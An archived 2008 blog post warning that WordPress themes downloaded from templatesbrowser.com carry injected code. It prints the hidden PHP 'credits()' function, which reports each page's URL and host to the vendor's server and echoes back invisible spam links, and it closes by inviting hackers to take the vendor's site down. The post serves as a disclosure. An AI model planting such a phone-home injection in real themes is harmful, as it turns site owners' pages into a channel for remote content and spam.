@@ -1,0 +1,132 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Don&#39;t ever user www.templatesbrowser.com for wordpress themes | chapter31</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta content="" name="keywords">
+    <meta content="Don&#39;t ever user www.templatesbrowser.com for wordpress themes - chapter31" property="og:title">
+    <link rel="stylesheet" href="http://chapter31.com/css/style.css">
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/github.min.css">
+    
+</head>
+
+<body>
+
+<section class="section">
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="nav-item" href="http://chapter31.com"><h1 class="title is-2">chapter31</h1></a>
+      </div>
+      <div class="nav-right">
+        <nav class="nav-item level is-mobile">
+          
+          <a class="level-item" href="http://michaelsharman.com">
+            <span class="icon">
+              <i class="fa fa-user-circle"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://github.com/michaelsharman">
+            <span class="icon">
+              <i class="fa fa-github"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://twitter.com/michaelsharman">
+            <span class="icon">
+              <i class="fa fa-twitter"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="/index.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+          </a>
+          
+        </nav>
+      </div>
+    </nav>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <h2 class="subtitle is-6">January 24, 2008</h2>
+    <h1 class="title">Don&#39;t ever user www.templatesbrowser.com for wordpress themes</h1>
+    
+    <div class="content">
+      <p>Today I noticed a JavaScript error on my site, on investigation I saw the following JavaScript code in the page source:</p>
+
+<pre><code class="language-javascript">var CCounter=2151068; var CCsite=www.chapter31.com; CCinvisible=0;
+&lt;nosc/ript&gt;&lt;a hreflang=&quot;de&quot; lang=&quot;de&quot; href=&quot;http://www.portalux.com/&quot;&gt;online casino&lt;/a&gt;&lt;/nosc/ript&gt;
+var CCounter=2151068; var CCsite=www.chapter31.com; CCinvisible=0;
+</code></pre>
+
+<p>My investigations found that where I downloaded the template from was a nice (NOT) little site called <a href="http://www.templatesbrowser.com/wordpress-themes/">http://www.templatesbrowser.com/</a>. Now what they do is add a &ldquo;functions.php&rdquo; file in the original code base, then call a method from the footer &ldquo;credits();&rdquo; which is in the functions.php file:</p>
+
+<pre><code class="language-javascript">&lt;?php
+
+function credits()
+{
+ $url = &quot;http://get.templatesbrowser.com/wp.php?&quot; .
+       &quot;url=&quot; . urlencode($_SERVER['REQUEST_URI']) . &quot;&amp;&quot; . &quot;host=&quot; . urlencode($_SERVER['HTTP_HOST']);
+ $check = @fsockopen(&quot;get.templatesbrowser.com&quot;, 80, $errno, $errstr, 3);
+ if($check)
+ {
+  @readfile($url);
+  fclose($check);
+ }
+}
+
+?&gt;
+</code></pre>
+
+<p>More information was found from <a href="http://www.onnoot.com/e/532/Templatesbrowser.com_puts_link_spam_in_WordPress">www.onnoot.com/</a>:</p>
+
+<blockquote>
+<p>This produces a link at the bottom of every WordPress page, that is invisible for human readers.</p>
+
+<p>Templatesbrowser.com apparently does this to increase the pagerank of certain websites. Weâ€™re not sure if Google falls for this little link spam trick. But if Google does find out that your page contains link spam, you risk being punished. That could mean that your website is removed from Google&rsquo;s search result pages.</p>
+</blockquote>
+
+<p>So for those who don&rsquo;t know I hope this was useful, if any people out there are crackers/hackers do me a favour and pull their site down :)</p>
+
+    </div>
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="container has-text-centered">
+    <p>&copy; <a href="http://michaelsharman.com">Michael Sharman</a> 2017</p>
+  </div>
+</section>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/languages/go.min.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/languages/dockerfile.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-306772-2', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
+</body>
+</html>
+
